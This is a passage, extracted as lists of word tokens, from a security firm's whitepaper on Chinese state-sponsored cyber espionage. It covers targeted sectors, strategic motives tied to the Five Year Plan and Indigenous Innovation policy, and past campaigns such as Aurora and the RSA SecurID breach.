"rather", "than", "considering", "the", "type", "of", "information", "the", "attacker", "seeks"], ["to", "steal", ".", "If", "a", "criminal", "gang", "unleashes", "a", "phishing", "attack", "aimed", "at", "harvesting", "banking"], ["credentials", "and", "it", "is", "the", "employees", "of", "a", "butchers", "shop", "and", "a", "bakery", "that", "fall", "victim", "to", "it", ",", "that"], ["does", "not", "mean", "the", "attack", "was", "targeting", "bread", "and", "meat", "."], ["Bearing", "this", "in", "mind", ",", "we", "divide", "target", "areas", "into", "the", "following", "categories:"], ["Political", ".", "The", "information", "targeted", "will", "inform", "the", "state", "on", "the", "political", "positions", "of"], ["other", "governments", "on", "a", "range", "of", "issues", ",", "including", "economics", ",", "trade", "and", "human"], ["rights", ".", "Typical", "targets", "are", "government", "departments", ",", "embassies", ",", "trade", "bodies", ",", "NGOs", ","], ["and", "international", "political", "groups", "such", "as", "the", "UN", ",", "G20", ",", "World", "Bank", "and", "IMF", "."], ["Commercial", ".", "The", "information", "targeted", "will", "be", "of", "value", "to", "the", "private", "sector", "within"], ["that", "country", "(even", "if", "the", "lines", "between", "private", "and", "public", "sectors", "are", "blurred)", ".", "It", "may"], ["include", "IPR", ",", "product", "designs", ",", "negotiating", "positions", "for", "sales", "discussions", ",", "mergers", "and"], ["acquisitions", "information", "and", "strategic", "plans", "(particularly", "in", "relation", "to", "the", "attacking"], ["country)", "."], ["Intelligence", ".", "The", "information", "targeted", "here", "will", "be", "used", "to", "safeguard", "internal", "security"], ["by", "the", "attacker", "country", "(this", "may", "entail", "intimidation", "or", "close", "monitoring", "of", "minority", "or"], ["opposition", "groups", "or", "individuals)", "and", "to", "enable", "analysis", "of", "the", "military", "technology", ","], ["capabilities", "and", "intentions", "of", "other", "countries", "."], ["There", "are", "a", "number", "of", "major", "problems", "that", "need", "to", "be", "overcome", "when", "seeking", "a"], ["complete", "understanding", "of", "the", "scale", "and", "purpose", "of", "attacks", ".", "Many", "will", "never", "be", "detected", ","], ["those", "that", "are", "may", "not", "always", "be", "reported;", "and", "the", "vast", "majority", "are", "not", "investigated", "by"], ["professionals", "with", "a", "good", "understanding", "of", "these", "types", "of", "attack", ".", "Dealing", "with", "the", "technical"], ["aspects", "of", "the", "compromise", "alone", "is", "not", "enough:", "the", "victim", "needs", "to", "know", "why", "they", "were"], ["being", "attacked", ",", "by", "whom", ",", "what", "data", "was", "stolen", "and", "where", "it", "may", "go", "."], ["While", "government", "agencies", ",", "such", "as", "the", "Centre", "for", "the", "Protection", "of", "National", "Infrastructure4"], ["(CPNI)", "in", "the", "UK", "and", "the", "FBI5", "in", "the", "US", ",", "are", "working", "successfully", "with", "larger", "organisations", "to"], ["identify", "potential", "threats", ",", "reduce", "the", "risk", "of", "successful", "attacks", "and", "in", "some", "cases", "to", "identify"], ["and", "investigate", "specific", "compromises", ",", "this", "assistance", "is", "not", "available", "to", "every", "company", ".", "It", "is"], ["not", "generally", "available", "to", "those", "that", "need", "it", "the", "most", "\u2013", "companies", "that", "innovate", "and", "excel"], ["in", "niche", "areas", "and", "supply", "technology", "or", "products", "that", "other", "companies", "make", "use", "of", "in"], ["larger", "projects", ".", "These", "companies", "live", "and", "die", "by", "the", "success", "of", "their", "research", "and"], ["development", ",", "but", "often", "lack", "the", "budgetary", "resources", "or", "expertise", "required", "to", "adequately"], ["protect", "their", "networks", "from", "this", "type", "of", "threat", "."], ["Even", "when", "compromises", "are", "investigated", "by", "companies", "that", "understand", "the", "attackers", "and"], ["their", "motives", ",", "it", "is", "often", "not", "felt", "to", "be", "in", "the", "interests", "of", "either", "party", "to", "publish", "the", "findings", "of"], ["those", "investigations", ",", "or", "to", "share", "the", "results", "with", "the", "affected", "company\u2019s", "competitors", ",", "who"], ["4"], ["http://www", ".", "cpni.gov.uk"], ["5"], ["http://www", ".", "fbi.gov/"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["5", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["may", "be", "suffering", "from", "similar", "attacks", ".", "There", "is", "also", "a", "widespread", "lack", "of", "understanding", "of"], ["targeted", "attacks", "among", "IT", "staff", ",", "a", "lack", "of", "dedicated", "IT", "security", "personnel", "and", ",", "sometimes", "as"], ["a", "consequence", "of", "IT", "functions", "being", "outsourced", ",", "an", "over-reliance", "on", "traditional", "security"], ["products", "such", "as", "anti-virus", "and", "firewalls", "\u2013", "both", "of", "which", "are", "ineffective", "against", "even", "lower"], ["end", "targeted", "attacks", ".", "The", "pressure", "exerted", "on", "IT", "staff", "from", "the", "business", "is", "primarily"], ["concerned", "with", "service", "uptime", "and", "availability", "rather", "than", "security;", "and", "budgets", "for", "even"], ["routine", "security", "operations", "such", "as", "penetration", "testing", "are", "under", "constant", "pressure", ".", "It", "is", "a"], ["sad", "fact", "that", ",", "for", "many", "businesses", ",", "money", "for", "IT", "security", "only", "becomes", "available", "once", "a"], ["serious", "problem", "has", "been", "identified", ",", "by", "which", "time", "it", "is", "often", "too", "late", "."], ["One", "more", "common", "problem", "in", "private", "sector", "companies", "is", "that", "some", "managers", "take", "the"], ["attitude", "that", "they", "would", "prefer", "not", "to", "know", "about", "security", "problems", ".", "Information"], ["Technology", "departments", "may", "worry", "that", "commissioning", "a", "detection", "exercise", "to", "find"], ["compromised", "hosts", "in", "their", "environment", ",", "could", "reveal", "a", "series", "of", "attacks", "and", "the", "theft", "of"], ["data", ",", "which", "might", "not", "be", "good", "for", "their", "career", "prospects", ".", "Higher", "up", "the", "management"], ["chain", ",", "board", "members", "may", "even", "choose", "not", "to", "spend", "money", "on", "security", "on", "the", "grounds"], ["that", "this", "will", "affect", "profitability", "and", "perhaps", "the", "size", "of", "their", "salaries", "or", "bonuses", ".", "They", "may"], ["instead", "prefer", "to", "postpone", "any", "major", "spending", "on", "security", "until", "they", "absolutely", "have", "to", "."], ["Why", "Cyber", "?"], ["Clearly", ",", "the", "Chinese", "government", "is", "keen", "to", "understand", "the", "political", "decisions", "taken", "by", "other"], ["countries", "and", "the", "activities", "of", "opposition", "groups", "within", "China", ",", "so", "it", "is", "hardly", "surprising", "that", "it"], ["orchestrates", "the", "compromise", "of", "computers", "via", "emailed", "Trojan", "attachments", "or", "links", "to"], ["compromised", "websites", "on", "a", "large", "scale", ".", "This", "is", "nothing", "new;", "just", "traditional", "espionage", "with", "a"], ["new", "methodology", "."], ["Until", "recently", "China", ",", "like", "most", "other", "developed", "countries", ",", "would", "have", "hand-picked"], ["intelligence", "officers", "from", "universities", "and", "the", "military", ",", "trained", "them", "in", "the", "arts", "of", "developing"], ["relationships", ",", "recruiting", "agents", "and", "how", "to", "covertly", "gather", "information", "to", "pass", "back", "to"], ["Beijing", ".", "They", "would", "have", "been", "deployed", "to", "embassies", "overseas", "or", "under", "a", "business", "cover", "."], ["The", "arrival", "of", "the", "Internet", "did", "not", "sound", "the", "death", "knell", "for", "human", "spying", ",", "it", "simply", "offered"], ["an", "attractive", "alternative", ".", "Moving", "espionage", "operations", "into", "the", "virtual", "world", "brings", "some"], ["advantages", ".", "Firstly", ",", "it", "does", "not", "require", "anyone", "to", "be", "sent", "overseas", ".", "This", "is", "an", "important"], ["change", "for", "the", "governments", "of", "communist", "countries", ",", "naturally", "suspicious", "of", "the", "long", "term"], ["intentions", "of", "even", "their", "most", "trusted", "officials", ".", "It", "means", "there", "is", "less", "need", "to", "invest", "in", "lengthy"], ["training", "processes", ".", "Instead", ",", "hacking", "operations", "can", "be", "broken", "down", "into", "simple", "tasks", "and"], ["partly", "automated", "to", "minimise", "the", "need", "for", "operators", "with", "advanced", "technical", "skills", "."], ["Conducting", "these", "operations", "is", "cheap", "and", "carries", "a", "lesser", "risk", "than", "human", "espionage:", "even"], ["if", "the", "target", "is", "fairly", "certain", "as", "to", "the", "origin", "of", "an", "attack", ",", "the", "sponsoring", "government", "can"], ["claim", "to", "be", "a", "victim", "of", "mistaken", "identity", "or", "of", "a", "western", "conspiracy", "."], ["But", "the", "key", "benefit", "of", "this", "type", "of", "espionage", "is", "that", "any", "piece", "of", "information", "stored"], ["anywhere", "in", "the", "world", "on", "a", "computer", "or", "a", "network", "connected", "to", "the", "Internet", "is", "only", "a", "few"], ["clicks", "away", "from", "being", "stolen", ".", "There", "are", "even", "attacks", "that", "are", "designed", "to", "jump", "to"], ["computers", "not", "connected", "to", "the", "Internet", ".", "If", "the", "prize", "is", "great", "enough", "and", "the", "attacker", "is"], ["determined", "enough", ",", "there", "is", "always", "a", "way", "."], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["6", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["How", "Cyber", "?"], ["This", "paper", "is", "not", "concerned", "with", "\u2018how\u2019", "the", "attacks", "happen", ",", "which", "is", "a", "subject", "for", "a", "white"], ["paper", "in", "its", "own", "right", ".", "Typically", "however", ",", "the", "attackers", "target", "the", "desktops", "and", "laptops", "of"], ["the", "victim\u2019s", "organisation", "and", "send", "emails", "with", "an", "attachment", "containing", "an", "exploit", ",", "(often"], ["an", "Adobe", "PDF", "or", "Microsoft", "Office", "document)", "that", "is", "targeted", "at", "one", "person", ".", "Once", "the"], ["victim", "opens", "the", "attachment", "the", "exploit", "executes", ",", "typically", "downloading", "and", "automatically"], ["installing", "a", "Trojan", ",", "which", "the", "attacker", "can", "then", "use", "to", "access", "the", "victim\u2019s", "system", ".", "The"], ["attackers", "also", "utilise", "website", "vulnerabilities", "which", "exploit", "vulnerabilities", "in", "web", "browsers", "such"], ["as", "Internet", "Explorer", "or", "Firefox", "to", "download", "malicious", "code", "onto", "a", "machine", "when", "a", "user"], ["clicks", "on", "a", "link", "in", "an", "email", ".", "Once", "the", "attacker", "has", "this", "foothold", "on", "the", "network", ",", "they"], ["typically", "look", "to", "download", "and", "use", "further", "hacking", "tools", "to", "escalate", "privileges", "to", "gain"], ["administrative", "access", "to", "key", "internal", "servers", "such", "as", "Domain", "Controllers", "or", "File", "Servers", ".", "Once"], ["achieved", ",", "the", "attackers", "typically", "use", "another", "remote", "desktop", "or", "laptop", "on", "the", "network", "to"], ["collate", "the", "data", "stolen", "and", "exfilitrate", "it", "to", "their", "remote", "servers", "."], ["In", "the", "case", "that", "a", "network", "is", "fully", "patched", "and", "constitutes", "a", "hard", "target", ",", "the", "attackers", "can"], ["respond", "and", "raise", "their", "game", "substantially", ".", "This", "could", "include", "exploiting", "a", "zero", "day"], ["vulnerability6", "or", "employing", "other", "means", "of", "installing", "an", "implant", ",", "such", "as", "using", "physical"], ["access", "to", "introduce", "an", "attack", "or", "even", "attacking", "a", "supply", "chain", "."], ["The", "Targets"], ["Despite", "opening", "up", "greatly", "over", "the", "last", "15", "years", ",", "China", "is", "still", "very", "much", "run", "by", "the"], ["Communist", "Party", ".", "The", "Party", "has", "control", "over", "and", "involvement", "in", "every", "area", "of", "daily", "life", ",", "but"], ["despite", "the", "internal", "focus", ",", "China", "is", "careful", "to", "keep", "an", "eye", "on", "the", "outside", "world", "and", "how", "the"], ["country\u2019s", "institutions", "and", "companies", "are", "perceived", "by", "foreign", "governments", ".", "An"], ["understanding", "of", "other", "countries\u2019", "political", "positions", "on", "key", "issues", "that", "affect", "China", "is", "key", "to"], ["forward", "planning", ",", "especially", "for", "an", "economy", "built", "on", "cheap", "exports", "."], ["The", "governments", "in", "which", "the", "Chinese", "state", "is", "most", "interested", "fall", "into", "three", "groups:", "its"], ["nearest", "neighbours:", "Japan", ",", "Taiwan", ",", "the", "disputed", "(semi-autonomous)", "Tibet", ",", "Mongolia", "and"], ["the", "Muslim", "\u2018Stans\u2019", "to", "the", "west;", "other", "powerful", "states", "with", "international", "influence", "such", "as", "the"], ["US", ",", "Russia", ",", "the", "UK", ",", "Germany", ",", "France", "and", "India;", "and", "finally", "states", "with", "strong", "economic", "links"], ["to", "China", "including", "Brazil", ",", "Iran", ",", "Australia", ",", "parts", "of", "Africa", "and", "Southeast", "Asia", "."], ["Whilst", "China", "will", "not", "be", "interested", "in", "the", "entire", "spectrum", "of", "government", "affairs", "in", "each", "of"], ["these", "countries", ",", "there", "will", "be", "some", "interest", "in", "some", "parts", "of", "all", "these", "governments\u2019", "activities", "."], ["Gathering", "information", "on", "this", "scale", "is", "a", "massive", "task:", "monitoring", "relevant", "issues", ",", "identifying"], ["individuals", "with", "access", "to", "that", "information", "and", "crafting", "attacks", "in", "the", "appropriate", "form", "and"], ["language", "."], ["The", "other", "constant", "preoccupation", "of", "the", "Chinese", "government", "is", "the", "maintenance", "of"], ["internal", "and", "external", "security", ".", "The", "enemies", "of", "the", "internal", "state", "are", "referred", "to", "as", "the", "\u2018Five"], ["Poisons\u2019:", "the", "separatist", "Uighurs", "(a", "mainly", "Muslim", "group", "in", "Northeast", "China)", ",", "Tibetan"], ["separatists", ",", "pro-democracy", "supporters", ",", "supporters", "of", "an", "independent", "Taiwan", "and", "followers"], ["of", "the", "religious", "group", "Falun", "Gong", ".", "Keeping", "tabs", "on", "these", "groups", "and", "on", "their", "known"], ["supporters", "at", "home", "and", "overseas", "is", "another", "huge", "task", ".", "The", "Ministry", "of", "State", "Security", "monitors"], ["6"], ["A", "zero", "day", "vulnerability", "is", "one", "which", "is", "not", "publicly", "known", "and", "for", "which", "no", "patch", "exists", "."], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["7", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["the", "communications", "between", "individuals", "and", "groups", ",", "a", "task", "made", "considerably", "easier"], ["through", "the", "deployment", "of", "Trojans", "to", "compromise", "computer", "equipment", ".", "As", "a", "minimum", ","], ["security", "services", "would", "usually", "seek", "to", "steal", "email", "account", "login", "and", "password", "details", "in"], ["order", "to", "be", "able", "to", "log", "in", "remotely", "and", "read", "emails", ".", "Google", "has", "confirmed", "this", "activity", "was"], ["taking", "place", "on", "the", "Gmail", "accounts", "of", "Chinese", "dissidents", ".", "7"], ["China", "wants", "a", "clear", "picture", "of", "other", "countries\u2019", "military", "activities", "in", "order", "to", "inform", "its", "own"], ["tactical", "and", "strategic", "decisions", ".", "Human", "penetrations", "of", "foreign", "military", "organisations", "are"], ["extremely", "difficult", "and", "carry", "significant", "risks", ",", "so", "relatively", "passive", "email", "attacks", "are", "an"], ["excellent", "substitute", "activity", ",", "where", "no", "single", "incident", "can", "be", "seen", "as", "an", "act", "of", "aggression"], ["meriting", "a", "military", "response", ".", "It", "remains", "to", "be", "seen", "whether", "thousands", "of", "attacks", "conducted"], ["over", "a", "long", "period", "of", "time", "will", "come", "to", "be", "regarded", "as", "having", "been", "a", "provocative", "act"], ["warranting", "a", "military", "response", "."], ["While", "China", "has", "been", "publicly", "\u2013", "albeit", "mostly", "not", "directly", "\u2013", "accused", "of", "carrying", "out", "attacks"], ["against", "governments", ",", "military", "organisations", "and", "military", "contractors", "numerous", "times", ",", "there"], ["are", "also", "plenty", "of", "examples", "of", "private", "sector", "organisations", "being", "targeted", ".", "Several", "stand"], ["out", "from", "the", "last", "few", "years:", "the", "\u2018Aurora8\u2019", "attacks", "that", "hit", "Google", ",", "Adobe", ",", "Juniper", ",", "Northrup"], ["Grumman", "and", "others;", "the", "McAfee-dubbed", "\u2018Night", "Dragon9\u2019", "attacks", "that", "struck", "companies"], ["around", "the", "world", "in", "the", "energy", "sector;", "and", "the", "\u2018Shady", "RAT", "10\u2019", "attacks", "that", "affected", "the", "steel"], ["industry", ",", "heavy", "engineering", ",", "construction", "and", "communications", "companies", "and", "others", "."], ["Interestingly", ",", "despite", "reporting", "on", "the", "intrusions", ",", "McAfee", "does", "not", "highlight", "the", "fact", "that", "antivirus", "software", "did", "little", "to", "stop", "the", "attacks", "in", "the", "first", "place", ".", "In", "all", "likelihood", "all", "these", "various"], ["\u2018operations\u2019", "formed", "part", "of", "the", "same", "attack", ",", "with", "different", "groups", "or", "military", "units", "carrying"], ["out", "operations", "sponsored", "by", "the", "Chinese", "state", ".", "One", "attack", "that", "was", "clearly", "carefully"], ["planned", ",", "and", "equally", "linked", "to", "the", "others", ",", "was", "that", "conducted", "against", "RSA11", ",", "whereby"], ["attackers", "stole", "information", "which", "allowed", "them", "to", "replicate", "the", "SecurID", "tokens", "used", "by"], ["companies", "to", "authenticate", "individuals", "logging", "onto", "their", "networks", "from", "remote", "locations", "."], ["Armed", "with", "those", "stolen", "credentials", ",", "an", "attacker", "would", "be", "able", "to", "log", "in", "to", "company"], ["networks", "as", "if", "a", "real", "user", ".", "The", "full", "extent", "of", "this", "breach", "has", "not", "been", "publicly", "disclosed", ","], ["though", "we", "do", "know", "that", "Lockheed", "Martin", "was", "attacked", "and", "we", "can", "speculate", "that", "other"], ["defence", "contractors", "were", "also", "targeted", ".", "As", "full", "details", "of", "what", "was", "stolen", "have", "never", "been"], ["put", "into", "the", "public", "domain", ",", "we", "can", "only", "guess", "at", "the", "targeted", "information", ".", "Google", "claimed"], ["Intellectual", "Property", "had", "been", "stolen", ",", "though", "no", "further", "details", "were", "given", ".", "But", "these"], ["companies", "were", "all", "targeted", "for", "a", "reason", ".", "Data", "was", "identified", "that", "would", "somehow", "be", "of"], ["use", "to", "China", ".", "We", "will", "look", "at", "who", "laid", "out", "the", "requirements", "for", "this", "data", "next", "."], ["7"], ["http://googleblog", ".", "blogspot.com/2010/01/new-approach-to-china.html"], ["8", "http://en", ".", "wikipedia.org/wiki/Operation_Aurora"], ["9", "http://www", ".", "mcafee.com/ca/resources/white-papers/wp-global-energy-cyberattacks-"], ["night-dragon", ".", "pdf"], ["10", "http://www", ".", "mcafee.com/us/resources/white-papers/wp-operation-shady-rat.pdf"], ["11"], ["http://www", ".", "rsa.com/node.aspx?id=3872"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["8", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["The", "Requirements"], ["We", "should", "never", "think", "of", "Chinese", "cyber", "attacks", "as"], ["uncoordinated", ",", "random", "or", "indiscriminate", ".", "They", "target"], ["companies", ",", "governments", "or", "individuals", "because", "a", "specific"], ["requirement", "has", "been", "identified", ".", "Context", "has", "studied", "a"], ["number", "of", "Chinese", "government", "policies", ",", "documents", "and"], ["stated", "aspirations", ",", "as", "well", "as", "Chinese", "commercial", "structures", ","], ["which", "may", "show", "why", "targets", "may", "have", "been", "picked;", "and"], ["may", "also", "help", "companies", "to", "gauge", "whether", "their", "business"], ["should", "consider", "itself", "to", "be", "at", "risk", "of", "being", "targeted", "by", "a"], ["Chinese", "attacker", "."], ["The", "key", "documents", "are", "the", "Five", "Year", "Plan", "and", "the", "National"], ["Outline", "for", "Medium", "and", "Long", "Term", "S&T", "Development", ".", "We"], ["will", "also", "theorise", "around", "the", "(unwritten)", "intelligence"], ["requirements", ".", "We", "will", "then", "later", "investigate", "China\u2019s", "state-owned", "enterprises", "as", "potential"], ["generators", "of", "requests", "for", "material", "to", "be", "stolen", "via", "targeted", "attacks;", "and", "as", "consumers", "of"], ["stolen", "data", "."], ["The", "Five", "Year", "Plan", "is", "a", "series", "of", "development", "initiatives", ",", "both", "social", "and", "economic", ",", "that", "set"], ["high", "level", "goals", "for", "where", "the", "Communist", "Party", "would", "like", "to", "see", "the", "country", "in", "five", "years\u2019"], ["time", ".", "The", "latest", "Plan", "was", "finalised", "in", "October", "2010", "and", "applies", "to", "the", "period", "2011", "\u2013", "2015", ".", "It"], ["contains", "goals", "for", "urbanisation", "rates", "and", "targets", "for", "economic", "growth;", "details", "the", "foreign"], ["industries", "that", "will", "be", "invited", "to", "do", "business", "in", "China", ",", "the", "scale", "of", "proposed", "construction"], ["projects", "and", "areas", "of", "the", "country/economy", "where", "further", "development", "should", "be"], ["encouraged", ".", "These", "high", "level", "goals", "filter", "down", "to", "all", "government", "departments", "at", "national", ","], ["regional", "and", "local", "level", ",", "where", "individual", "initiatives", "are", "managed", ".", "But", "the", "plan", "also", "hints", "at"], ["the", "areas", "where", "China", "feels", "it", "needs", "to", "concentrate", "its", "efforts", ",", "or", "where", "it", "needs", "to", "catch", "up"], ["with", "other", "countries", "elsewhere", "in", "the", "world", "."], ["However", ",", "targeted", "attacks", "are", "\u2018state", "sponsored\u2019", ",", "which", "means", "that", "it", "is", "not", "the", "government"], ["that", "conducts", "the", "attack", ",", "but", "departments", "of", "the", "state", "or", "affiliated", "groups", ".", "When", "the"], ["government", "decides", "that", ",", "for", "example", ",", "it", "requires", "intelligence", "relating", "to", "US", "military"], ["operations", "in", "Afghanistan", ",", "different", "parts", "of", "the", "state", "intelligence", "apparatus", "will", "respond", "to"], ["this", "requirement", ",", "each", "bringing", "different", "skill", "sets", "to", "bear", "on", "the", "problem", "of", "finding", "the"], ["required", "information", ".", "For", "example", ",", "the", "People\u2019s", "Liberation", "Army", "(PLA)", "has", "departments", "with"], ["access", "to", "satellite", "photography", ",", "which", "could", "provide", "information", "on", "troop", "movements", "."], ["Another", "department", "may", "have", "access", "to", "Signals", "Intelligence", "(SIGINT)", ",", "which", "intercepts"], ["communications", ".", "Chinese", "diplomats", "in", "the", "country", "will", "speak", "with", "their", "Afghan", "counterparts"], ["about", "the", "situation", ",", "while", "intelligence", "officers", ",", "perhaps", "in", "diplomatic", "or", "even", "non-official"], ["roles", ",", "are", "able", "to", "exploit", "human", "agents", "with", "access", "to", "useful", "reporting", ".", "To", "complement", "all", "of"], ["these", "sources", ",", "cyber", "attacks", "can", "be", "used", "against", "a", "variety", "of", "targets", "such", "as", "the", "Pentagon", ","], ["military", "forces", "in", "theatre", ",", "the", "US", "embassy", ",", "defence", "contractors", "and", "representatives", "of", "the"], ["UN", "and", "NATO", ".", "As", "cyber", "proves", "its", "worth", "(if", "it", "hasn\u2019t", "already)", "other", "parts", "of", "the", "government"], ["will", "seek", "to", "develop", "their", "own", "cyber", "capability", "to", "add", "to", "their", "existing", "capabilities", ",", "not"], ["wishing", "to", "be", "outshone", "by", "competing", "departments", "."], ["One", "of", "the", "points", "on", "the", "Five", "Year", "Plan", "for", "instance", "is", "\u2018More", "efficient", "development", "of"], ["nuclear", "power", "under", "the", "precondition", "of", "ensured", "safety\u2019", ",", "which", "could", "suggest", "that", "any"], ["information", "gathering", "attacks", "against", "the", "nuclear", "energy", "industry", "(as", "opposed", "to", "sabotage"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["9", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["or", "Stuxnet12", "style", "attacks)", "could", "be", "carried", "out", "with", "the", "express", "intention", "of", "supporting", "this"], ["part", "of", "the", "Plan", "."], ["The", "attacks", "could", "be", "directed", "against", "nuclear", "plants", "themselves", "in", "an", "attempt", "to", "obtain"], ["operating", "information;", "construction", "companies", ",", "to", "steal", "building", "plans", "(which", "may", "also", "be"], ["of", "value", "to", "the", "military", "in", "case", "of", "war);", "regulatory", "bodies", "for", "rules", ",", "policies", "and", "procedures;"], ["and", "any", "of", "the", "hundreds", "of", "companies", "that", "build", "parts", "for", "the", "plant", "or", "develop", "technology"], ["used", "in", "the", "nuclear", "process", "."], ["In", "terms", "of", "who", "could", "be", "carrying", "out", "the", "attacks", ",", "we", "have", "to", "consider", "not", "only", "the", "military"], ["(the", "Third", "Department", "of", "the", "PLA", "has", "the", "remit", "for", "cyber", "operations", ",", "though", "other", "areas", "are"], ["likely", "to", "have", "some", "capability", "too)", ",", "but", "also", "nuclear", "construction", "companies", ",", "the"], ["government", "department", "with", "a", "remit", "for", "the", "energy", "industry", ",", "or", "any", "of", "the", "hacking", "groups"], ["that", "are", "closely", "affiliated", "to", "the", "state", ".", "Different", "campaigns", "may", "even", "be", "competing", "to", "steal"], ["the", "same", "information", "with", "the", "rewards", "going", "to", "the", "attackers", "who", "get", "it", "first", "."], ["The", "Plan", "also", "advocates", "the", "development", "of", "high-end", "manufacturing", ",", "hi-tech", "industry", ","], ["modern", "agriculture", ",", "high-speed", "rail", "and", "hydropower", ".", "The", "Plan", "does", "not", "explain", "in", "any", "detail"], ["how", "this", "development", "will", "be", "achieved", ",", "although", "in", "some", "cases", "it", "does", "specify", "that", "certain"], ["areas", "will", "be", "prioritised", "for", "direct", "foreign", "investment", ".", "In", "these", "cases", ",", "foreign", "firms", "are", "invited"], ["to", "partner", "with", "local", "firms", "to", "complete", "a", "project", "and", "engage", "in", "\u2018technology", "transfer\u2019", ".", "This"], ["means", "(officially)", "that", "the", "Chinese", "company", "will", "learn", "skills", "from", "the", "foreign", "company", "and"], ["develop", "their", "own", "capabilities", "in", "the", "area", ".", "Unofficially", ",", "it", "generally", "ends", "up", "with", "the", "foreign"], ["company", "having", "its", "IP", "and", "technology", "stolen", "and", "then", "finding", "that", "it", "no", "longer", "has", "an"], ["invitation", "to", "do", "business", "in", "the", "country", "."], ["One", "good", "example", "of", "technology", "transfer", "can", "be", "seen", "in", "the", "area", "of", "high", "speed", "railways", "."], ["Originally", ",", "trains", "were", "purchased", "from", "Kawasaki", ",", "Siemens", "and", "Bombardier", "and", "these"], ["manufacturers", "helped", "create", "the", "first", "high", "speed", "lines", "which", "opened", "in", "2007", ".", "Soon"], ["afterwards", "China", "started", "to", "build", "its", "own", "high", "speed", "trains", ",", "modelled", "on", "those", "imported", ",", "but"], ["with", "reconfigured", "components", ".", "There", "is", "an", "ongoing", "legal", "case", "brought", "by", "Kawasaki", "and"], ["other", "Japanese", "companies", "relating", "to", "Chinese", "companies", "attempting", "to", "patent", "Kawasaki"], ["technology", "associated", "with", "high", "speed", "rail13", ".", "The", "current", "Chinese", "patent", "laws", "specify", "that"], ["the", "owner", "of", "a", "patent", "registered", "in", "China", "must", "be", "Chinese", "and", "that", "the", "Chinese", "holder", "will"], ["also", "be", "favoured", "over", "any", "foreign", "claim", "for", "the", "same", "technology", "."], ["In", "July", "2011", "two", "high", "speed", "trains", "collided", "near", "Wenzhou", ",", "killing", "(according", "to", "state", "media)"], ["40", "people", ".", "There", "were", "concerns", "that", "the", "trains", "contained", "stolen", "foreign", "technology", "and", "it"], ["has", "been", "suggested", "that", "this", "is", "why", "the", "wreckage", "was", "buried", "even", "before", "the", "rescue"], ["operation", "had", "been", "completed", ".", "It", "has", "also", "been", "suggested", "in", "certain", "quarters", "that", "burying"], ["the", "wreckage", "stopped", "any", "investigation", "by", "the", "manufacturers", "into", "what", "went", "wrong", "(and"], ["whether", "or", "not", "there", "was", "stolen", "technology", "present)", ".", "This", "action", "attracted", "widespread"], ["criticism", "of", "the", "government", ",", "even", "from", "some", "sources", "within", "China", "."], ["12"], ["13"], ["http://www", ".", "bbc.co.uk/news/technology-11388018"], ["http://online", ".", "wsj.com/article/SB10001424052748704814204575507353221141616.html"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["10", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["Boosting", "Domestic", "Enterprise"], ["If", "the", "Five", "Year", "Plan", "is", "short", "on", "detail", ",", "the", "National", "Outline", "for", "Medium", "and", "Long", "Term", "S&T"], ["Development", "is", "not", ".", "This", "policy", "essentially", "sets", "out", "the", "requirement", "for", "\u2018Indigenous"], ["Innovation\u2019", ",", "the", "areas", "where", "China", "should", "not", "rely", "on", "western", "technology", ",", "but", "should"], ["develop", "a", "home-grown", "alternative", ".", "The", "strong", "desire", "for", "domestic", "products", "stems", "from", "two"], ["issues", ".", "Firstly", "a", "suspicion", "that", "foreign", "technology", "could", "be", "used", "covertly", "in", "ways", "for", "which", "it"], ["was", "not", "originally", "intended", "it", "would", "be", "used", "(for", "the", "benefit", "of", "the", "attacking", "country)", "."], ["Secondly", "because", "in", "order", "to", "sustain", "high", "growth", "rates", "and", "satisfy", "domestic", "consumption", "it"], ["is", "better", "if", "China", "manufactures", "products", "of", "equal", "capability", "and", "sells", "them", "to", "its", "own", "market"], ["than", "it", "is", "to", "import", "goods", "at", "high", "prices", ".", "The", "plan", "for", "Indigenous", "Innovation", "drills", "down", "into"], ["each", "of", "the", "areas", "where", "China", "wants", "to", "develop", "a", "capability", "in", "some", "detail", ",", "even", "setting"], ["out", "priorities", ".", "The", "list", "of", "eleven", "areas", "comprises:"], ["Energy", ".", "Oil", "and", "gas", "exploration", ",", "distribution", "and", "power", "grids", ",", "low", "cost", "renewable"], ["energy", ",", "coal", "liquefaction", ",", "industrial", "energy", "efficiency"], ["Water", "and", "Mineral", "Resources", ".", "Distribution", ",", "conservation", ",", "desalination", ",", "zoning", "and"], ["development", "of", "resources"], ["Environment", ".", "Pollutant", "control", "and", "recycling", ",", "restoration", "of", "vulnerable", "ecosystems", ","], ["maritime", "ecosystem", "protection", ",", "environmental", "change"], ["Agriculture", ".", "Genetic", "resource", "development", ",", "disease", "prevention", ",", "use", "of", "agro-forest"], ["biomass", ",", "multifunctional", "farming", "equipment", ",", "modern", "dairy", "industry"], ["Manufacturing", "Industry", ".", "Basic/generic", "parts/components", ",", "digital", "intelligent", "design", ","], ["recycling", "iron", "and", "steel", ",", 